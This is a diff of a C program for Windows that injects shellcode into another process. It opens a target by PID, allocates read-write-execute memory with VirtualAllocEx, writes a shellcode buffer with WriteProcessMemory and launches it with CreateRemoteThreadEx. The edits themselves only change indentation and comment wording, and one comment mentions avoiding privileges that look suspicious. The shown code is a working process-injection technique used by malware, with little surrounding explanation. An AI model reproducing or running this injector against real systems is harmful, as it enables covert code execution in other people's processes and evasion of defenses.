@@ -72,7 +72,7 @@ unsigned char Shellcode[] =
 
 int main()
 {
-//Step 1: Attach to/Create a process. Use (OpenProcess/CreateProcess)
+	//Step 1: Attach to/Create a process. Use (OpenProcess/CreateProcess)
 	printf("PID:");
 	scanf("%ld", &PIDProcess);
 	printf("\n[?] Trying to open a handle to process with PID: %ld\n", PIDProcess);
@@ -89,19 +89,19 @@ int main()
 
 	printf("[+] Got handle to the process: 0x%p\n", hProcess);
 
-//Step 2: Allocate some memory within that process. Use (VirtualAlloc)
-  MemoryBuffer = VirtualAllocEx(hProcess, NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	//Step 2: Allocate some memory within that process. Use (VirtualAlloc)
+	MemoryBuffer = VirtualAllocEx(hProcess, NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-	//Shellcodes won't be able to be executed if there is a NX/DEP. Same goes if there are not enough privileges, and too many privileges will end up resulting suspicious
+	//Shellcodes won't be able to be executed if there is NX/DEP enabled. The same goes if there are not enough privileges (rwx), and too many privileges will end up resulting suspicious
 	if (MemoryBuffer == NULL)
 	{
-    printf("[-] Couldn't allocate bytes to process memory. Error: %ld\n", GetLastError());
+		printf("[-] Couldn't allocate bytes to process memory. Error: %ld\n", GetLastError());
 		return EXIT_FAILURE;
 	}
 
 	printf("[+] Memory allocated successfully (%zu bytes) with PAGE_EXECUTE_READWRITE (rwx) permissions\n", sizeof(Shellcode));
 
-//Step 3: Write the memory to the process. Use (WriteProcessMemory)
+	//Step 3: Write the memory to the process. Use (WriteProcessMemory)
 	BOOL isDone = WriteProcessMemory(hProcess, MemoryBuffer, Shellcode, sizeof(Shellcode), NULL);
 	if (isDone == FALSE)
 	{
@@ -111,7 +111,7 @@ int main()
 
 	printf("[+] Wrote %zu bytes to the process memory", sizeof(Shellcode));
 
-//Step 4: Create a thread to run our payload
+	//Step 4: Create a thread to run our payload
 	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MemoryBuffer, NULL, 0, 0, ThreadID);
 
 	if (hThread == NULL)
@@ -120,11 +120,11 @@ int main()
 		CloseHandle(hProcess);
 		printf("[-] An error occurred... Error: %ld\n", GetLastError());
 		return EXIT_FAILURE;
-        }
+	}
 
-//To avoid cleaning up while the Shellcode is being executed, we can use WaitForSingleObject()
+	//To avoid cleaning up while the Shellcode is being executed, we can use WaitForSingleObject()
 	WaitForSingleObject(hThread, INFINITE);
-	printf("Waiting for the thread to finish executing\n");
+	printf("Waiting for the thread to finish execution\n");
 	printf("[+] Got a handle to the thread. ThreadID: %ld -- hThread is: 0x%p\n", ThreadID, hThread);
 	printf("[+] Closing the handle and the thread which are currently open...\n");
 	CloseHandle(hProcess);
